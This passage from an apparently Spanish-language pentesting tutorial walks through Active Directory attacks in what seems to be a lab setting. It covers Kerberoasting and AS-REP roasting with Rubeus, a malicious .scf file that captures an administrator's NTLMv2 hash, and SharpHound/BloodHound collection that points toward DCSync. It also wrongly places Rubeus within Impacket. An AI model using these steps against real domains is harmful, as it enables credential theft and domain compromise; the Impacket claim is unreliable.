- **Opciones de filtrado**: Rubeus permite filtrar las cuentas de servicio según varios criterios, como el nombre de SPN, el nombre de la cuenta o grupos de usuarios específicos. Esto permite ataques Kerberoasting más dirigidos y eficientes.

- **Automatización y secuencias de comandos**: Rubeus puede generar secuencias de comandos y automatizarse, lo que permite el procesamiento por lotes de múltiples cuentas de servicio. Esto puede ser especialmente útil cuando se trata de una gran cantidad de cuentas de servicio en el dominio.

- **Funciones ampliadas**: Rubeus ofrece funciones adicionales más allá de Kerberoasting, como captura de boletos, ataques de pase de boleto y generación de Golden Ticket. Estas características hacen de Rubeus una herramienta versátil para varios ataques relacionados con Kerberos.

En resumen, mientras que Kerberoasting regular se refiere a la técnica general de explotar las vulnerabilidades de Kerberos para descifrar las contraseñas de las cuentas de servicio, Rubeus Kerberoasting se refiere específicamente al uso de la herramienta Rubeus para automatizar y simplificar el proceso de Kerberoasting al tiempo que proporciona funciones y flexibilidad adicionales.

Primero nos descargamos la herramienta [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) a nuestro directorio de trabajo y la subimos a la máquina víctima:

<img src="/assets/Tips/AD/rubeus.png">

Listamos el panel de ayuda de la aplicación y observamos cómo podemos acontecer un ataque `kerberoasting`:

<img src="/assets/Tips/AD/roasting.png">

Ejecutamos para el usuario `jcampo` con su password:

<img src="/assets/Tips/AD/atope.png">

Esto es lo mismo que el kerberoasting habitual, podemos usar cualquier credencial mientras sea válida. Ahora podemos intentar descifrar la contraseña con john.

## Rubeus - AS-REP Roast

El ataque AS-REP Roasting es una técnica utilizada para extraer mensajes cifrados AS-REP (respuesta del servicio de autenticación) de un controlador de dominio en un entorno de Windows Active Directory. Se dirige a las cuentas de usuario que tienen habilitada la marca "No requiere autenticación previa de Kerberos", lo que permite extraer el mensaje AS-REP cifrado y potencialmente descifrarlo sin conexión.

La principal diferencia entre un ataque regular de AS-REP Roast y un ataque de AS-REP Roast con Rubeus radica en las herramientas utilizadas y las características adicionales proporcionadas por Rubeus.

- En un ataque regular de AS-REP Roast, normalmente usaría métodos manuales o secuencias de comandos personalizadas para identificar las cuentas de usuario con el indicador de autenticación previa deshabilitado, extraer los mensajes de AS-REP e intentar descifrarlos utilizando técnicas fuera de línea como diccionario o ataques de fuerza bruta. .

- Rubeus, por otro lado, es una herramienta dentro del marco de Impacket diseñada específicamente para automatizar y simplificar los ataques relacionados con Kerberos. Proporciona funcionalidades para realizar ataques AS-REP Roasting y ofrece varias ventajas:

- AS-REP Roasting automatizado: Rubeus agiliza el proceso de tueste AS-REP al automatizar la extracción de mensajes AS-REP del controlador de dominio.

- Funcionalidad mejorada: Rubeus proporciona características adicionales más allá de AS-REP Roasting, como la capacidad de solicitar y extraer boletos TGT (Ticket Granting Ticket), manipular boletos de Kerberos, realizar ataques de pase de boleto y más.

- Formatos de salida flexibles: Rubeus ofrece opciones para generar los mensajes AS-REP extraídos en varios formatos, lo que facilita el procesamiento y el análisis de los resultados.

- Técnicas de ataque adicionales: Rubeus incluye otras técnicas de ataque relacionadas con Kerberos, como Kerberoasting, ataques Golden Ticket y ataques Silver Ticket, lo que permite una gama más amplia de escenarios de ataque.

En resumen, mientras que tanto los ataques regulares de AS-REP Roast como los ataques de AS-REP Roast que utilizan Rubeus tienen como objetivo la misma vulnerabilidad, Rubeus proporciona un enfoque más simplificado y rico en funciones para automatizar el proceso de ataque, extraer mensajes de AS-REP y ejecutar Kerberos adicionales.

Ejecutamos de la siguiente forma:

<img src="/assets/Tips/AD/asrep.png">

Lo mismo que de costumbre. Ahora puede copiar el hash y descifrarlo, como hicimos en el ataque regular.

## Archivos SCF

Un archivo **SCF**, también conocido como **Shell Command File**, es un formato de archivo utilizado en los sistemas operativos Windows. Se asocia principalmente con Windows Explorer Shell, que proporciona la interfaz gráfica de usuario (GUI) para interactuar con archivos, carpetas y operaciones del sistema.

Un archivo SCF es un archivo de texto que contiene una serie de comandos que se ejecutan cuando se abre o se accede al archivo. Estos comandos pueden incluir varias acciones, como iniciar aplicaciones, ejecutar scripts o realizar operaciones del sistema.

En el contexto de Windows, los archivos SCF se utilizan normalmente con fines de personalización y automatización. Los usuarios pueden crear archivos SCF para realizar tareas específicas o automatizar acciones repetitivas. Por ejemplo, un archivo SCF puede contener comandos para abrir carpetas específicas, iniciar aplicaciones con configuraciones predefinidas o realizar configuraciones del sistema.

Primero listamos los recursos compartidos a nivel de red para el usuario `jcampo` en el DC:

<img src="/assets/Tips/AD/shared.png">

Observamos un recurso `sharedFiles` sobre el cual tenemos permisos de escritura, nos conectamos a este recurso:

<img src="/assets/Tips/AD/sharedconnect.png">

Creamos el archivo `.scf` malicioso y lo subimos al recurso compartido:

<img src="/assets/Tips/AD/file.png">

Por último creamos un servidor `smb`:

<img src="/assets/Tips/AD/smbserver.png">

En este punto cuando el usuario abra el recurso compartido en el DC recibiremos la petición en nuestro servidor `smb` capturando el hash NTLMv2 del usuario Administrador:

<img src="/assets/Tips/AD/adminfile.png">

<img src="/assets/Tips/AD/adminhash.png">

## BloodHound & neo4j


Para ver toda la información de DC claramente, vamos a usar **bloodhound** y **neo4j**. Puede instalar esas herramientas ejecutando `apt install bloodhound neo4j`.

### Uso

Primero de todo arrancamos el servidor con `neo4j` con el comando `neo4j console`:

<img src="/assets/Tips/AD/neo4j.png">

Si es la primera vez que ejecutamos neo4j debemos acceder por el navegador web a `http://localhost:7474` y modificar la contraseña que viene por defecto que es `neo4j:neo4j`:

<img src="/assets/Tips/AD/password.png">

En este punto ya podemos ejecutar BloodHound con `bloodhound & disown` yy conectarnos con nuestras credenciales:

<img src="/assets/Tips/AD/blood.png">

En BloodHound debemos subir un comprimido `.zip` el cual generaremos desde la máquina víctima. para ello nos haremos servir de un script en PowerShell [SharpHound.ps1](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1). Lo descargamos y subimos a la máquina vícitima. Nos conectamos con `evil-winrm` ya que nos otorga una consola con PowerShell:

<img src="/assets/Tips/AD/evil.png">

Primero debemos importar el módulo con `Import-Module .\SharpHound.ps1` y después ediante el comando `Invoke-BloodHound -CollectionMethod All` nos genera el arvchivo `.zip` donde recolectará toda la información del DC:

<img src="/assets/Tips/AD/invoke.png">

<img src="/assets/Tips/AD/zip.png">

Nos descargamos el .zip a nuestra máquina de atacante y lo subimos a BloodHound:

<img src="/assets/Tips/AD/upload.png">

<img src="/assets/Tips/AD/complete.png">

En este punto en la pestaña de `Analysis` podemos ejecutar un amplia opción de consultas tal como encontrar los usuarios con los que ejecutar un ataque DCSync. Haciendo click secundario en `DCSync` y `Help` nos muestra información de como ejecutar el ataque tanto en Windows como en Linux.

<img src="/assets/Tips/AD/dnsync.png">

Para ver un ejemplo práctico más detallado podéis ver el writeup de la máquina [Sauna](https://yorch82.github.io/posts/HTB-Sauna/) de HackTheBox que tengo en mi blog.